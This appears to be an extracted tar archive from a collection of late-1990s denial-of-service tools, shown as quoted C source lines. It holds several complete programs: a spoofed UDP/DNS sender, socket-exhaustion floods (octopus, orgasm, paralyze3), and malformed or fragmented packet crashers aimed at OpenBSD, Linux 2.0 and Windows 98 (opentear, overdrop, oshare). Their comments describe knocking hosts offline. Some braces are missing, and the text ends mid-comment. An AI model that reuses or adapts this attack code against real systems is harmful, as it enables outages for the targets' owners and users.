            "        struct hostent *Host;",
            "        unsigned long int value;",
            "        if(!name) {",
            "                gethostname(buf, 100);",
            "                printf(\"Using this host as source..\\n\");",
            "                name=buf;",
            "        }",
            "        if(!(Host=gethostbyname(name)))",
            "                Host=gethostbyaddr(name, strlen(name), AF_INET);",
            "        if(!Host) {",
            "                printf(\"Unknown host: %s\\n\", (name)? name:\"<NULL>\");",
            "                return(0);",
            "        }",
            "        memcpy(&value, Host->h_addr_list[0], 4);",
            "        return(value);",
            "/*************************************************************************",
            "** Usage: i=SendUDP(from, to, data, len, socket)",
            "** Fore: 'data' points to first byte of a UDP datagram of 'len' bytes.",
            "**      'from' and 'to' represent IP addresses in network-byte-order.",
            "**      'socket' must be an previously opened RAW_SOCKET.",
            "** After: if i=1, 'data' was sent, via 'socket' as an UDP package to 'to'",
            "**      spoofed as originating from 'from'.",
            "**      if i!=1, an error occured and no data was send.",
            "*************************************************************************/",
            "int SendUDP(unsigned long int from, unsigned long int to, char *data,",
            "                                                int len, int sock) {",
            "        char buf[len+sizeof(struct iphdr)];",
            "        struct in_addr host;",
            "        struct iphdr *ip=(struct iphdr *)buf;",
            "        struct sockaddr_in sin;",
            "        sin.sin_family=AF_INET;",
            "        sin.sin_addr.s_addr=to;",
            "        sin.sin_port=((struct udphdr *)data)->dest;",
            "        bzero((void *)buf, sizeof(struct iphdr)+len);",
            "        ip->version=4;",
            "        ip->ihl=5;",
            "        ip->tos=0;",
            "        ip->tot_len=htons(sizeof(struct iphdr)+len);",
            "        ip->id=htons(0xdead);",
            "        ip->frag_off=0;",
            "        ip->ttl=255;",
            "        ip->protocol=IPPROTO_UDP;",
            "        ip->saddr=from;",
            "        ip->daddr=to;",
            "        /* Note: Checksum will be calculated by the kernel. */",
            "        memcpy(buf+sizeof(struct iphdr), data, len);",
            "        host.s_addr=(unsigned long int)from;",
            "        printf(\"Sending from: %s -> \", inet_ntoa(host));",
            "        host.s_addr=(unsigned long int)to;",
            "        printf(\"to: %s \", inet_ntoa(host));",
            "        printf(\" %d bytes.\\n\", len);",
            "        return(sendto(sock, buf,len+sizeof(struct iphdr), 0,",
            "                                (struct sockaddr *)&sin, sizeof(sin)));",
            "void CreatePayload(char **Payload, int *len) {",
            "        static char buf[sizeof(struct udphdr)+sizeof(HEADER)];",
            "        struct udphdr *udp=(struct udphdr *)buf;",
            "        HEADER *dns=(HEADER *) (buf+sizeof(struct udphdr));",
            "        bzero((void *)buf, sizeof(HEADER)+sizeof(struct udphdr));",
            "        udp->source=htons(1111);",
            "        udp->dest=htons(53);    /* domain */",
            "        udp->len=htons(sizeof(struct udphdr)+sizeof(HEADER));",
            "        udp->check=0;",
            "        dns->qr=1;              /* This is an answer */",
            "        *len=sizeof(struct udphdr)+sizeof(HEADER);",
            "        *Payload=buf;",
            "int main(int argc, char *argv[]) {",
            "        extern char *optarg;",
            "        extern int optind, opterr, optopt;",
            "        char c, *source=0, *dest=0, *package;",
            "        int sock, len;",
            "        unsigned long int from, to;",
            "        if((sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {",
            "                printf(\"No raw socket. Who are you ?\\n\");",
            "                exit(-1);",
            "        }",
            "        setuid(getuid());",
            "        while(1) {",
            "                c = getopt(argc, argv, \"hs:d:\");",
            "                        if( c == -1)",
            "                                break;",
            "                switch(c) {",
            "                        case 's':",
            "                                source = optarg;",
            "                                break;",
            "                        case 'd':",
            "                                dest=optarg;",
            "                                break;",
            "                        case 'h':",
            "                                Usage(argv[0]);",
            "                                break;",
            "                        default:",
            "                                Usage(argv[0]);",
            "                                break;",
            "                }",
            "        }",
            "        if(!dest)  {",
            "                printf(\"Huhm, ehrm, didn't we forget something ?\\n\");",
            "                Usage(argv[0]);",
            "        }",
            "        from=GetHost(source);",
            "        to=GetHost(dest);",
            "        if(!from || !to) {",
            "                printf(\"Error, can't locate \");",
            "                printf(\"%s host address.\\n\", (from)? \"target\":\"source\");",
            "                exit(-1);",
            "        }",
            "        CreatePayload(&package, &len);",
            "        SendUDP(from, to, package, len, sock);",
            "        return(0);",
            "/*                    www.hack.co.za                    */",
            "datapool/src/octopus.c",
            "0100644",
            "0000000",
            "0000000",
            "00000010277",
            "07077712252",
            "014027",
            "ustar  ",
            "root",
            "root",
            "/*  This little program opens as many sockets with a remote",
            " *  host as can be supported by both.  It catches ^C and kill",
            " *  commands to shut down cleanly by closing all open connections",
            " *  before exiting.  Often, a remote workstation can be brought",
            " *  to its knees by saturating its process table via multiple",
            " *  invocations of sendmail.  That's why port 25 (the sendmail",
            " *  port) is the default.  If the target's process table (set",
            " *  when the target kernel was created) is filled, users will be",
            " *  unable to execute any shell commands.  Many MUDs also crash",
            " *  when the number of sockets they have open exceeds a certain",
            " *  number.  This program will put stress on MUDs by testing",
            " *  their limits.  If a limit is reached, the MUD will either",
            " *  crash or will refuse to let new users log in.",
            " *  The program is incomplete, in that it doesn't check for",
            " *  socket timeouts and subsequently reuse timed out sockets.",
            " *  That means the program can only keep a remote host / mud",
            " *  locked up until it exhausts its own available new sockets,",
            " *  or until it has reached MAX_DESCRIPTORS remote connections",
            " *  as set by the #define statement.",
            " *  If the local machine starts issuing error messages, then",
            " *  the program has failed to saturate the remote host and has",
            " *  instead reached the limits of the local machine.  Use ^C or",
            " *  the kill command to terminate it.  If you are knowledgable",
            " *  about rebuilding kernels and have access to the root account,",
            " *  you can build a special kernel that will allow you to reach",
            " *  a much larger number of open sockets.",
            " *  Before running this, be sure to issue the c shell command:",
            " *              'limit descriptors nnn'",
            " *  where nnn is the largest descriptor limit, as revealed",
            " *  by the 'limit -h' command if applicable.  Some unixes may",
            " *  not have a descriptors category at all.",
            " *  This program has been tested with SunOS version 4.1.3, Irix",
            " *  version 5, and with Linux.",
            " *  You don't need to be a privileged user to run it.",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <signal.h>",
            "#define MAX_DESCRIPTORS 2500",
            "int i, fd[MAX_DESCRIPTORS];",
            "void CatchTERM()",
            "printf(\"\\nCaught sig TERM or INT! Cleaning up.\\n\");",
            "for( ; i>=0; i--) {",
            "         if( shutdown( fd[i], 2 ) < 0 ) perror(\"shutdown\");",
            "         printf(\"Closing %i\\n\", i);",
            "         if( close( fd[i] ) ) perror(\"close\");",
            "         }",
            "printf(\"Done. Committing suicide. ARRGH!\\n\");",
            "exit (1);",
            "main(argc,argv)",
            "int argc;",
            "char *argv[];",
            "         int     opt,pid;",
            "         struct  sockaddr_in sin[MAX_DESCRIPTORS];",
            "         char    buf[2];",
            "         if( argc < 2 ) {",
            "            printf(\"Usage:\\t%s address [port]\\n\", argv[0] );",
            "            printf(\"\\twhere address is a numeric internet address\\n\");",
            "            printf(\"\\tand port is an optional port number (default=25)\\n\");",
            "            exit (0);",
            "                    }",
            "         pid = getpid();",
            "         opt = 1;",
            "         signal( SIGTERM, CatchTERM);",
            "         signal( SIGINT, CatchTERM);",
            "  for ( i=0; i<MAX_DESCRIPTORS; i++) {",
            "       fd[i] = socket(AF_INET, SOCK_STREAM, 0);",
            "       if ( fd[i] < 0 ) { printf(\"socket %i failed\\n\",i);",
            "                          perror(\"socket\");",
            "                         }",
            "           else {",
            "/*  Someday, the following call will be used to allow socket reuse ...  */",
            "/*      if ( setsockopt( fd[i], SOL_SOCKET, SO_REUSEADDR, ( char *) &opt,",
            " *       sizeof(opt)) < 0 ) {",
            " *           printf(\"setsockopt %i failed\\n\",i); sleep(10); }",
            "         bzero((char *)&sin[i], sizeof(sin[0]));",
            "         sin[i].sin_family = AF_INET;",
            "         sin[i].sin_addr.s_addr = inet_addr(argv[1]);",
            "         sin[i].sin_port = htons((argc > 2) ? atoi(argv[2]) : 25);",
            "         if( connect(fd[i], &sin[i], sizeof(sin[0])) < 0) {",
            "             printf(\"connect %i failed.\\n\",i);",
            "             perror(\"connect\");",
            "             break;",
            "                                 }",
            "         read(fd[i], buf, 1);",
            "         printf(\"pid: %i, desc %i\\n\", pid, i);",
            "                }",
            "  i--;",
            "  printf(\"closing connection.\\n\");",
            "  for ( ; i>=0; i-- ) { if( shutdown( fd[i], 2) <0) perror(\"shutdown\");",
            "                 if( close(fd[i]) ) perror(\"close\");",
            "                 else printf(\"closed %i\\n\", i);",
            "                 }",
            "datapool/src/opentear.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011601",
            "07056714224",
            "014136",
            "ustar  ",
            "root",
            "root",
            "Rootshell License",
            "LICENSE: THIS PROGRAM MAY BE FREELY DISTRIBUTED AS LONG AS THE CONTENTS OF",
            "THIS FILE ARE NOT MODIFIED.",
            "This file may not be posted on AntiOnline (http://www.antionline.com) or",
            "AntiCode (http://www.anticode.com).  Their staff has a history of removing",
            "all traces of Rootshell copyright notices on code that we write.  Please",
            "report any violations of this policy to Rootshell.",
            " * modified newtear.c - sends lots of fragmented UDP packets",
            " * crashes OpenBSD 2.3 and 2.4.",
            " * Patches:",
            " * http://www.openbsd.org/errata24.html#maxqueue (2/17/99)",
            " * [ http://www.rootshell.com/ ] - 2/10/1999",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define PADDING 0x0",
            "#define MAGIC   0x3",
            "#define COUNT   0x1",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short, u_short);",
            "int main(int argc, char **argv)",
            "    int one = 1, i, rip_sock, x=1, id=1;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"raw socket\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 2) usage(argv[0]);",
            "    if (!(dst_ip = name_resolve(argv[1])))",
            "    {",
            "        exit(1);",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    fprintf(stderr, \"Sending fragmented UDP flood.\\n\");",
            "    for (;;) {",
            "      x ++;",
            "      src_ip = x*10;",
            "      src_prt = x*10;",
            "      dst_prt = x+1*10;",
            "      if (x>10)",
            "        x = 1;",
            "      for (i = 0; i < 10; i++)",
            "      {",
            "          send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt, id++);",
            "      }",
            "    }",
            "    return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "                u_short dst_prt, u_short id)",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    /*",
            "     * Grab some memory for our packet, align p_ptr to point at the beginning",
            "     * of our packet, and then fill it with zeros.",
            "     */",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING); // Set it all to zero",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(id);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 247;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8);",
            "    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr,",
            "            \"%s dst_ip\\n\",",
            "            name);",
            "    exit(0);",
            "datapool/src/orgasm.c",
            "0100644",
            "0000000",
            "0000000",
            "00000006042",
            "07100655635",
            "013614",
            "ustar  ",
            "root",
            "root",
            "/* orgasm.c. by napster/Aut0psy ",
            " * Werdup to Aut0psy the master debugger/fixer wh0re.",
            " * portscans then floods the fark out of the person... ",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#define MAX                      1024",
            "#define VERSION             \"1.0 pre\"",
            "/* Prototypes */",
            "unsigned int resolve(char *host);",
            "void pscan(unsigned int resolved_host, int portlow, int porthigh, int hitport[]);",
            "void reseed(void);",
            "void usage(char *progname) {",
            "  printf(\"orgasm.c by napster %s...\\n\", VERSION);",
            "  printf(\"usage: %s <address> <portlow> <porthigh> <# connex>\\n\",progname);",
            "  exit(-1);",
            "int a = 1;",
            "main(int argc, char *argv[]) {",
            "  unsigned int resolved_host;",
            "  struct sockaddr_in sin[MAX];",
            "  int x, y, q, sdesc[MAX];",
            "  int portlow, porthigh, connex;",
            "  int hitport[1024];",
            "  if (argc < 5 || argc > 5) usage(argv[0]);",
            "  reseed();",
            "  resolved_host = resolve(argv[1]);    ",
            "  portlow  = atoi(argv[2]);",
            "  porthigh = atoi(argv[3]);",
            "  connex   = atoi(argv[4]);",
            "\t      ",
            "  system(\"clear\");",
            "  printf(\"                         orgasm.c by napster %s\\n\", VERSION);",
            "  printf(\"                                 [1.28.97]\\n\\n\");",
            "  printf(\"Target address: %s\\n\", argv[1]);",
            "  printf(\"Port scanning target...\\n\");",
            "  printf(\"Ports open:\");",
            "  pscan(resolved_host, portlow, porthigh, hitport);",
            "  printf(\"\\nPort info complete, flooding ports.\\n\");",
            "  for (x=1;x<a;x++) {",
            "    fork();",
            "    for (q=1;q<=connex;q++) {",
            "      /* Create Socket */",
            "      sdesc[q] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);",
            "      /* Fill in Socket Endpoint */",
            "      sin[q].sin_family = AF_INET;",
            "      sin[q].sin_port = hitport[x];",
            "      printf(\"%d hit\\n\", hitport[x]);",
            "      sin[q].sin_addr.s_addr = resolved_host;",
            "      /* Connect to dest host. */",
            "      connect(sdesc[q], (struct sockaddr *)&sin[q], sizeof(sin[q]));",
            "    }",
            "void pscan(unsigned int resolved_host, int portlow, int porthigh, int hitport[]) {",
            "  int z, sockdesc;",
            "  struct sockaddr_in sin;",
            "  reseed();",
            "  for(z=portlow;z<=porthigh;z++) {\t\t",
            "    /* z counts from the port low to the port high for scanning */",
            "    fflush(stdout);",
            "    sockdesc = socket(AF_INET, SOCK_STREAM, 0);",
            "    sin.sin_family = AF_INET;",
            "    sin.sin_port = htons(z);",
            "    sin.sin_addr.s_addr = resolved_host;",
            "    if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) == 0) {",
            "      printf(\" %d\", z);",
            "      hitport[a] = z;\t",
            "      /* In total, a should represent the number of ports open */",
            "      a++;",
            "    }",
            "unsigned int resolve(char *host) {",
            "  /* resolve routine written by Aut0psy. */",
            "  struct hostent *he;",
            "  struct sockaddr_in tmp;",
            "  /* Lookup host. */",
            "  he = gethostbyname(host);",
            "  if (he) {",
            "    /* Copy host into a temporary endpoint. */",
            "    memcpy((caddr_t)&tmp.sin_addr.s_addr, he->h_addr, he->h_length);",
            "    } ",
            "  else {",
            "    perror(\"resolving\");",
            "    exit(-1);",
            "    }",
            "  /* Return address in network byte order. */  ",
            "  return(tmp.sin_addr.s_addr);",
            "void reseed(void) {",
            "  /* Seed random number database based on time of day... */",
            "  srand(time(NULL));",
            "datapool/src/oshare_1_gou.c",
            "0100644",
            "0000000",
            "0000000",
            "00000015260",
            "06653251320",
            "014674",
            "ustar  ",
            "root",
            "root",
            "Date: Mon, 25 Jan 1999 15:38:43 +0900",
            "From: DEF CON ZERO WINDOW <defcon0@UGTOP.COM>",
            "To: BUGTRAQ@netspace.org",
            "Subject: Win98 crash?",
            " Windows98 crashed by the packet which added a hand to the value of the",
            "IP header of the packet a little. (From now, the packet of this  structure",
            "is called with \"oshare packet\".) Because it isn't familiar, I don't know",
            "what kind of error happens concretely inside OS to the inside of Windows.",
            "But, ihl and tot_len. Then, it guesses that crash will happen by the",
            "value of frag_bit&frag_off.",
            " But, because value is wrong, this \"oshare packet\" can't be transmitted",
            "to the outside of the network. This is here well, and it is here badly,",
            "too. But, even whose machine will be able to be killed in the same",
            "segment.",
            " Before someone improves this program, MicroSoft should take a",
            "countermeasure immediately.",
            " A Macintosh crashed by the \"oshare packet\" in the same way, too.",
            "But, it isn't realized by this program. It will be released soon.",
            " Reboot hangs freely if it becomes blue screen when Windows98 receives",
            "a \"oshare packet\". When blue screen comes out, the function of the",
            "network can't be used any more after it. The error of TCP/IP is started",
            "in the case of the Macintosh, and the function of the network can't be",
            "used any more.",
            " Is this phenomenon a bug?   $B!3 (B( $B!-!<!. (B) $B%N (B",
            "Signed by R00t Zer0",
            "-------------------",
            "/****************************************************************************/",
            "/*      [ oshare_1_gou  ver 0.1 ]  -- Dressing up No.1 --                   */",
            "/*                                                                          */                      ",
            "/*                                                                          */",
            "/*                                                                          */",
            "/*                                                                          */",
            "/*  This program transmits the \"oshare\" packet which starts a machine aga-  */",
            "/*  in or crash. But, because it can't pass through the router, it can be   */",
            "/*  carried out only in the same segment.                                   */",
            "/*  \"oshare packet\" is (frag 39193:-4@65528+), If ihl and tot_len are cha-  */",
            "/*  nged, it has already tested that it becomes possible to kill Mac, too.  */",
            "/*  -----------------------------------------                               */ ",
            "/*  Written by R00t Zer0                                                    */",
            "/*  E-Mail  : defcon0@ugtop.com                                             */",
            "/*  Web URL : http://www.ugtop.com/defcon0/index.htm                        */",
            "/****************************************************************************/",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <netinet/in_systm.h>",
            "#include <arpa/inet.h>",
            "u_short in_cksum( u_short *, int );",
            "int             send_oshare_packet( int, u_long );",
            "int             send_oshare_packet( int, u_long );",
            "u_short",
            "in_cksum( u_short *addr, int len )",
            "        {",
            "        int             nleft   = len;",
            "        u_short *w              = addr;",
            "        int             sum             = 0;",
            "        u_short answer  = 0;",
            "        while( nleft > 1 )",
            "                {",
            "                sum += *w++;",
            "                nleft -= 2;",
            "                }",
            "        if (nleft == 1)",
            "                {",
            "                *( u_char *)( &answer ) = *( u_char *)w;",
            "                sum += answer;",
            "                }",
            "        sum      = ( sum >> 16 ) + ( sum & 0xffff );",
            "        sum += ( sum >> 16 );",
            "        answer = ~sum;",
            "        return( answer );",
            "        }",
            "send_oshare_packet( int sock_send, u_long dst_addr )",
            "        {",
            "        char    *packet;",
            "        int             send_status;",
            "        struct  iphdr           *ip;",
            "        struct  sockaddr_in     to;",
            "        packet  = ( char *)malloc( 40 );",
            "        ip              = ( struct      iphdr *)( packet );",
            "        memset( packet, 0, 40 );",
            "        ip->version             = 4;",
            "        ip->ihl                 = 11;",
            "        ip->tos                 = 0x00;",
            "        ip->tot_len             = htons( 44 );",
            "        ip->id                  = htons( 1999 );",
            "        ip->frag_off    = htons( 16383 );",
            "        ip->ttl                 = 0xff;",
            "        ip->protocol    = IPPROTO_UDP;",
            "        ip->saddr               = htonl( inet_addr( \"1.1.1.1\" ) );",
            "        ip->daddr               = dst_addr;",
            "        ip->check               = in_cksum( ( u_short *)ip, 44 );",
            "        to.sin_family                   = AF_INET;",
            "        to.sin_port                             = htons( 0x123 );",
            "        to.sin_addr.s_addr              = dst_addr;",
            "        send_status = sendto( sock_send, packet, 40, 0,",
            "                             ( struct sockaddr *)&to, sizeof( struct sockaddr ) );",
            "        free( packet );",
            "        return( send_status );",
            "        }",
            "main( int argc, char *argv[] )",
            "        {",
            "        char    tmp_buffer[ 1024 ];",
            "        int             loop, loop2;",
            "        int             sock_send;",
            "        u_long  src_addr, dst_addr;",
            "        u_short src_port, dst_port;",
            "        struct  hostent         *host;",
            "        struct  sockaddr_in     addr;",
            "        time_t  t;",
            "        if( argc != 3 )",
            "                {",
            "                printf( \"Usage : %s <dst addr> <num(k)>\\n\", argv[0] );",
            "                exit( -1 );",
            "                }",
            "        t = time( 0 );",
            "        srand( ( u_int )t );",
            "        memset( &addr, 0, sizeof( struct sockaddr_in ) );",
            "        addr.sin_family                 = AF_INET;",
            "        addr.sin_addr.s_addr    = inet_addr( argv[1] );",
            "        if( addr.sin_addr.s_addr == -1 )",
            "                {",
            "                host = gethostbyname( argv[1] );",
            "                if( host == NULL )",
            "                        {",
            "                        printf( \"Unknown host %s.\\n\", argv[1] );",
            "                        exit( -1 );",
            "                        }",
            "                addr.sin_family = host->h_addrtype;",
            "                memcpy( ( caddr_t )&addr.sin_addr, host->h_addr, host->h_length );",
            "                }",
            "        memcpy( &dst_addr, ( char *)&addr.sin_addr.s_addr, 4 );",
            "        if( ( sock_send = socket( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) == -1)",
            "                {",
            "                perror( \"Getting raw send socket\" );",
            "                exit( -1 );",
            "                }",
            "        printf( \"\\n\\\"Oshare Packet\\\" sending\" );",
            "        fflush( stdout );",
            "        for( loop = 0; loop < atoi( argv[2] ); loop++ )",
            "                {",
            "                for( loop2 = 0; loop2 < 1000; loop2++ )",
            "                        send_oshare_packet( sock_send, dst_addr );",
            "                fprintf( stderr, \".\" );",
            "                fflush( stdout );",
            "                }",
            "        printf( \"\\n\\nDone.\\n\\n\" );",
            "        fflush( stdout );",
            "        close( sock_send );",
            "        exit( 0 );",
            "        }",
            "datapool/src/overdrop.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007644",
            "07100655663",
            "014176",
            "ustar  ",
            "root",
            "root",
            "// overdrop by lcamtuf [Linux 2.0.33 printk abuse]",
            "// ------------------------------------------------",
            "// based on (reaped from) teardrop by route|daemon9",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#define IP_MF\t0x2000",
            "#define IPH\t0x14",
            "#define UDPH\t0x8",
            "#define PADDING\t0x1c",
            "#define MAGIC\t0x3",
            "#define COUNT\t0xBEEF",
            "#define FRAG2\t0xFFFF",
            "void usage(char *name) {",
            "  fprintf(stderr,\"%s dst_ip [ -n how_many ] [ -s src_ip ]\\n\",name);",
            "  exit(0);",
            "u_long name_resolve(char *host_name) {",
            "  struct in_addr addr;",
            "  struct hostent *host_ent;",
            "  if ((addr.s_addr=inet_addr(host_name))==-1) {",
            "    if (!(host_ent=gethostbyname(host_name))) return (0);",
            "    bcopy(host_ent->h_addr,(char *)&addr.s_addr,host_ent->h_length);",
            "  return (addr.s_addr);",
            "void send_frags(int sock,u_long src_ip,u_long dst_ip,u_short src_prt,u_short dst_prt) {",
            "  u_char *packet=NULL,*p_ptr=NULL;",
            "  u_char byte;",
            "  struct sockaddr_in sin;",
            "  sin.sin_family=AF_INET;",
            "  sin.sin_port=src_prt;",
            "  sin.sin_addr.s_addr=dst_ip;",
            "  packet=(u_char *)malloc(IPH+UDPH+PADDING);",
            "  p_ptr=packet;",
            "  bzero((u_char *)p_ptr,IPH+UDPH+PADDING);",
            "  byte=0x45;",
            "  memcpy(p_ptr,&byte,sizeof(u_char));",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)=htons(IPH+UDPH+PADDING);",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)=htons(242);",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)|=htons(IP_MF);",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)=0x40;",
            "  byte=IPPROTO_UDP;",
            "  memcpy(p_ptr+1,&byte,sizeof(u_char));",
            "  p_ptr+=4;",
            "  *((u_long *)p_ptr)=src_ip;",
            "  p_ptr+=4;",
            "  *((u_long *)p_ptr)=dst_ip;",
            "  p_ptr+=4;",
            "  *((u_short *)p_ptr)=htons(src_prt);",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)=htons(dst_prt);",
            "  p_ptr+=2;",
            "  *((u_short *)p_ptr)=htons(8+PADDING);",
            "  if (sendto(sock,packet,IPH+UDPH+PADDING,0,(struct sockaddr *)&sin,",
            "      sizeof(struct sockaddr))==-1) {",
            "    perror(\"\\nsendto\");",
            "    free(packet);",
            "    exit(1);",
            "  p_ptr=&packet[2];",
            "  *((u_short *)p_ptr)=htons(IPH+MAGIC+1);",
            "  p_ptr+=4;",
            "  *((u_short *)p_ptr)=htons(FRAG2);",
            "  if (sendto(sock,packet,IPH+MAGIC+1,0,(struct sockaddr *)&sin,",
            "      sizeof(struct sockaddr))==-1) {",
            "    perror(\"\\nsendto\");",
            "    free(packet);",
            "    exit(1);",
            "  free(packet);",
            "int main(int argc, char **argv) {",
            "  int one=1,count=0,i,rip_sock;",
            "  u_long  src_ip=0,dst_ip=0;",
            "  u_short src_prt=0,dst_prt=0;",
            "  struct in_addr addr;",
            "  fprintf(stderr,\"overdrop by lcamtuf [based on teardrop by route|daemon9]\\n\\n\");",
            "  if((rip_sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {",
            "    perror(\"raw socket\");",
            "    exit(1);",
            "  if (setsockopt(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {",
            "    perror(\"IP_HDRINCL\");",
            "    exit(1);",
            "  if (argc < 2) usage(argv[0]);",
            "  if (!(dst_ip=name_resolve(argv[1]))) {",
            "    fprintf(stderr,\"Can't resolve destination address.\\n\");",
            "    exit(1);",
            "  while ((i=getopt(argc,argv,\"s:n:\"))!=EOF) {",
            "    switch (i) {",
            "      case 'n':",
            "        count   = atoi(optarg);",
            "        break;",
            "      case 's':",
            "        if (!(src_ip=name_resolve(optarg))) {",
            "          fprintf(stderr,\"Can't resolve source address.\\n\");",
            "          exit(1);",
            "        }",
            "\tbreak;",
            "      default:",
            "        usage(argv[0]);",
            "        break;",
            "    }",
            "  srandom((unsigned)(time((time_t)0)));",
            "  if (!count) count=COUNT;",
            "  fprintf(stderr,\"Sending oversized packets:\\nFrom: \");",
            "  if (!src_ip) fprintf(stderr,\"       (random)\"); else {",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr,\"%15s\",inet_ntoa(addr));",
            "  addr.s_addr = dst_ip;",
            "  fprintf(stderr,\"\\n  To: %15s\\n\",inet_ntoa(addr));",
            "  fprintf(stderr,\" Amt: %5d\\n\",count);",
            "  fprintf(stderr,\"[ \");",
            "  for (i=0;i<count;i++) {",
            "    if (!src_ip) send_frags(rip_sock,rand(),dst_ip,rand(),rand()); else",
            "      send_frags(rip_sock,src_ip,dst_ip,rand(),rand());",
            "    fprintf(stderr, \"b00z \");",
            "  fprintf(stderr, \"]\\n\");",
            "  return (0);",
            "datapool/src/paralyze3.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007653",
            "07100655702",
            "014242",
            "ustar  ",
            "root",
            "root",
            " * paralyze3.c, by xhostile [3.8.00]",
            " * | This program will open as many connections to a remote",
            " * | host as supported (by both ends).",
            " * |",
            " * | Many daemons surprisingly either crash or stop allowing",
            " * | new connections while under attack from this program.",
            " * | This is (usually) simply because the daemon wasn't",
            " * | written to handle such a mass flood of connections, and",
            " * | in result, panicks and errors.",
            " * |",
            " * | Since it is usually hard/impossible to spoof full",
